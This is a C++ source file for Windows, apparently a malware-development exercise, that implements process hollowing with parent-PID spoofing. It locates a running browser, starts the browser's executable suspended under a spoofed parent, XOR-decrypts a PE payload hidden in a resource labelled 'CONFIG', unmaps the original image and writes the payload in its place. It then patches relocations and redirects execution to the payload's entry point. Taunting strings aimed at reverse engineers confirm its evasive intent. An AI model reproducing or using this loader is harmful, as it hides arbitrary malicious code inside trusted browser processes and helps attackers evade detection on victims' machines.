/* 1. Rename conflicting structs AND their pointer types to fix conflicting with windows APIs or that's what AI told me */
#define _FILE_STAT_INFORMATION           _SDK_FILE_STAT_INFORMATION
#define _FILE_STAT_LX_INFORMATION        _SDK_FILE_STAT_LX_INFORMATION
#define _FILE_CASE_SENSITIVE_INFORMATION _SDK_FILE_CASE_SENSITIVE_INFORMATION

#define FILE_STAT_INFORMATION            SDK_FILE_STAT_INFORMATION
#define FILE_STAT_LX_INFORMATION         SDK_FILE_STAT_LX_INFORMATION
#define FILE_CASE_SENSITIVE_INFORMATION  SDK_FILE_CASE_SENSITIVE_INFORMATION

#define PFILE_STAT_INFORMATION           SDK_PFILE_STAT_INFORMATION
#define PFILE_STAT_LX_INFORMATION        SDK_PFILE_STAT_LX_INFORMATION
#define PFILE_CASE_SENSITIVE_INFORMATION SDK_PFILE_CASE_SENSITIVE_INFORMATION

#include <phnt_windows.h>

#undef _FILE_STAT_INFORMATION
#undef _FILE_STAT_LX_INFORMATION
#undef _FILE_CASE_SENSITIVE_INFORMATION

#undef FILE_STAT_INFORMATION
#undef FILE_STAT_LX_INFORMATION
#undef FILE_CASE_SENSITIVE_INFORMATION
#undef PFILE_STAT_INFORMATION
#undef PFILE_STAT_LX_INFORMATION
#undef PFILE_CASE_SENSITIVE_INFORMATION
#include <phnt.h>

#include<stdio.h>
#include<tlhelp32.h>
#include <stdint.h>

#ifdef _WIN64
#pragma message("Compiling as x64")
#else
#pragma message("Compiling as x86")
#endif

/*
// might need later
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (__stdcall *NT_OPEN_FILE)(OUT PHANDLE
FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES
ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG
ShareAccess, IN ULONG OpenOptions);

extern "C" void __stdcall RtlGetVersion(OSVERSIONINFO*);
*/


typedef struct BASE_RELOCATION_BLOCK {
      DWORD PageAddress;
      DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
      USHORT Offset: 12;
      USHORT Type: 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

bool CheckIfBrowser(wchar_t* processName) {
      bool res = false;
      const wchar_t* browsers[] = {
            L"chrome.exe",
            L"msedge.exe",
            L"firefox.exe",
            L"opera.exe"
      };
      for(const wchar_t* browser : browsers) {
            if(wcscmp(browser, processName) == 0) res = true;
      }

      return res;
}

void test_phnt(void) {
      PROCESS_BASIC_INFORMATION pbi = { sizeof(PROCESS_BASIC_INFORMATION) };
      ULONG returnLength = 0; 

      NTSTATUS status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
      );

      if(!NT_SUCCESS(status)) printf("[*] IT DIDN'T WORK CALL THE AMBULANCE: 0x%08X\n", status);
      else printf("[*] CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
}

DWORD RVAToRAW(
      DWORD rva,
      PIMAGE_NT_HEADERS nt,
      PIMAGE_SECTION_HEADER section 
) {
      for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
            DWORD size = section->Misc.VirtualSize;
            if(rva >= section->VirtualAddress && rva < section->VirtualAddress + size) {
                  return section->PointerToRawData + (rva - section->VirtualAddress);
            }
      }
      return 0;
}

int main() {
      WCHAR stop[] = L"Stop reversing the binary";
      WCHAR reconsider[] = L"Reconsider your life choices";
      WCHAR touch[] = L"And go touch some grass";
      WCHAR yorushiku[] = L"よろしくお願いします";

      // Creates a snapshot of processes
      HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      if(hSnapshot == INVALID_HANDLE_VALUE) {
            printf("[*] Failed to enumerate process");
      }

      PROCESSENTRY32 currentProcess = { sizeof(PROCESSENTRY32) };

      // Process32First(snapshot, [out] processStructure) -> PROCESSENTRY32

      printf("\t[Process name] \t[PID]\t[PPID] \n");
      
      if(!Process32First(hSnapshot, &currentProcess)) {
            printf("[*] Failed to read snapshot");
            CloseHandle(hSnapshot);
      }

      do {
      if(CheckIfBrowser(currentProcess.szExeFile)) {
            printf("%25S %8d %8d \n",
                        currentProcess.szExeFile, currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
            break;
       }
      } while(Process32Next(hSnapshot, &currentProcess));

      // OpenProcess to obtain a handle for NTCreateProcessEx
      HANDLE hParentProcess = OpenProcess(
        MAXIMUM_ALLOWED,
        FALSE,                                     
        currentProcess.th32ProcessID                                  
    );

      WCHAR cmdLine[MAX_PATH];
      DWORD size = MAX_PATH;
      QueryFullProcessImageNameW(hParentProcess, 0, cmdLine, &size);
      printf("[*] Obtained full path: %S\n", cmdLine);
 

    if(hParentProcess != NULL && hParentProcess != INVALID_HANDLE_VALUE) printf("[+] Obtained parent process \n");
     
     // Let's try the basic method of PPID
      STARTUPINFOEXW si = {};
      PROCESS_INFORMATION pi = {};
      SIZE_T attributeSize;
      ZeroMemory(&si, sizeof(STARTUPINFOEXW));

      InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
      si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);

      /*
       * BOOL InitializeProcThreadAttributeList(
       *    [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
       *    [in]            DWORD                        dwAttributeCount,
       *                    DWORD                        dwFlags,
       *    [in, out]       PSIZE_T                      lpSize
       * );
       */
      InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
      /*
      * BOOL UpdateProcThreadAttribute(
      *     [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
      *     [in]            DWORD                        dwFlags,
      *     [in]            DWORD_PTR                    Attribute, --
      *     [in]            PVOID                        lpValue, 
      *     [in]            SIZE_T                       cbSize,
      *     [out, optional] PVOID                        lpPreviousValue,
      *     [in, optional]  PSIZE_T                      lpReturnSize
      * );
      */
      UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
      si.StartupInfo.cb = sizeof(si);
      
      CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi);
      printf("[+] Child process created successfully: %8d\n", pi.dwProcessId); 
      
      HANDLE hChildProcess = pi.hProcess;       
      LPCONTEXT context = new CONTEXT();
      context->ContextFlags = CONTEXT_ALL;
      GetThreadContext(pi.hThread, context);
      
      // The book used Ebx which applies to x86 processes but since most systems are now x64 I defaulted to Rdx.
      // https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_PEB
      LPVOID pebImageBaseOffset = (PBYTE)context->Rdx + 0x10;
      LPVOID destImageBase = 0;
      SIZE_T bytesRead = NULL;
      ReadProcessMemory(
            hChildProcess, 
            pebImageBaseOffset, 
            &destImageBase, 
            sizeof(pebImageBaseOffset), 
            &bytesRead);
      printf("ImageBase: %p\n", destImageBase);
      
      // decrypting the resource
      HRSRC hResource = FindResourceW(NULL, L"MAIN", L"CONFIG");
      HGLOBAL resourceData = LoadResource(NULL, hResource);
      DWORD resourceSize = SizeofResource(NULL, hResource);
      void* exec = VirtualAlloc(NULL, resourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      memcpy(exec, resourceData, resourceSize);
      uint8_t key = 0xCC;
      for(size_t i = 0; i < resourceSize; ++i) {
            ((uint8_t*)exec)[i] ^= key;
      }

      PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)exec;
      PIMAGE_NT_HEADERS64 payloadImageNTHeaders = (PIMAGE_NT_HEADERS64)((uint8_t*)exec + payloadDosHeader->e_lfanew);
      SIZE_T payloadImageSize = payloadImageNTHeaders->OptionalHeader.SizeOfImage;
      
      NtUnmapViewOfSection(hChildProcess, destImageBase);

      // Allocate memory in the destination process
      LPVOID newPayloadImageBase = VirtualAllocEx(hChildProcess, destImageBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

      destImageBase = newPayloadImageBase;

      DWORD deltaImageBase = (DWORD)destImageBase - payloadImageNTHeaders->OptionalHeader.ImageBase;

      payloadImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
      WriteProcessMemory(hChildProcess, newPayloadImageBase, (uint8_t*)exec, payloadImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

      // Pointer to the first section
      PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER) ((uint8_t*)exec + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
      PIMAGE_SECTION_HEADER payloadImageSectionOld = payloadImageSection;

      SIZE_T payloadBytesRead = 0;

      int err = GetLastError();

      for(uint8_t i = 0; i < payloadImageNTHeaders->FileHeader.NumberOfSections; i++) {
            PVOID destSectionLocation = (PVOID)((ULONG_PTR)destImageBase + payloadImageSection->VirtualAddress);
            PVOID payloadSectionLocation = (PVOID)((uint8_t*)exec + payloadImageSection->PointerToRawData);
            WriteProcessMemory(hChildProcess, destSectionLocation, payloadSectionLocation, payloadImageSection->SizeOfRawData, NULL);
            printf("Section name: %.8s\n", payloadImageSection->Name);
            payloadImageSection++;
      }

      IMAGE_DATA_DIRECTORY relocationTable = payloadImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

      payloadImageSection = payloadImageSectionOld;
      for(uint8_t i = 0; i < payloadImageNTHeaders->FileHeader.NumberOfSections; i++) {
            printf("look for reloc\n");
           BYTE* relocSectionName = (BYTE*)".reloc";
           
           if(memcmp(payloadImageSection->Name, relocSectionName, 5) != 0) {
            payloadImageSection++;
            continue;
           }

           DWORD payloadRelocationTableRaw = payloadImageSection->PointerToRawData;
           DWORD relocationOffset = 0;

           PIMAGE_SECTION_HEADER firstSectionHeader = IMAGE_FIRST_SECTION(payloadImageNTHeaders);
           DWORD relocRaw = RVAToRAW(relocationTable.VirtualAddress, payloadImageNTHeaders, firstSectionHeader);
           // Start of relocation code

           while(relocationOffset < relocationTable.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((uint8_t*)exec + payloadRelocationTableRaw + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((uint8_t*)exec + payloadRelocationTableRaw + relocationOffset);

            printf("loop for reloc entries\n");
            for(DWORD y = 0; y < relocationEntryCount; y++) {
                  relocationOffset += sizeof(BASE_RELOCATION_ENTRY); 
                  printf("patch reloc entries\n");
                  printf("reloc type: %d\n", relocationEntries[y].Type);
                  printf("reloc offset: %d\n", relocationEntries[y].Offset);
                  if(relocationEntries[y].Type == 0) {
                        continue;
                  }

                  ULONG_PTR patchAddress = (ULONG_PTR)destImageBase + relocationBlock->PageAddress + relocationEntries[y].Offset;
                  ULONGLONG patchedBuffer = 0;
                  printf("Reloc block @%X | RVA=%X | PageAddress=%X | Size=%X\n", relocationOffset, patchAddress, relocationBlock->PageAddress, relocationBlock->BlockSize);
                  ReadProcessMemory(hChildProcess, 
                        (LPCVOID)patchAddress, 
                        &patchedBuffer, 
                        sizeof(ULONGLONG), 
                        &bytesRead);
                  patchedBuffer += deltaImageBase;

                  int readErr = GetLastError();
                  WriteProcessMemory(hChildProcess, 
                        (PVOID)patchAddress, 
                        &patchedBuffer, 
                        sizeof(ULONGLONG), 
                        &payloadBytesRead);

                  int writeErr = GetLastError();
            }
            
           }
      }


      ULONG_PTR patchedEntryPoint = (ULONG_PTR)destImageBase + payloadImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
      context->Rip = patchedEntryPoint;
      SetThreadContext(pi.hThread, context);
      ResumeThread(pi.hThread);
      WaitForSingleObject(pi.hThread, INFINITE);
      DWORD childExitCode;
      GetExitCodeProcess(hChildProcess, &childExitCode);
      printf("ChildExitCode: 0x%8x\n", childExitCode);
      return 0;
}
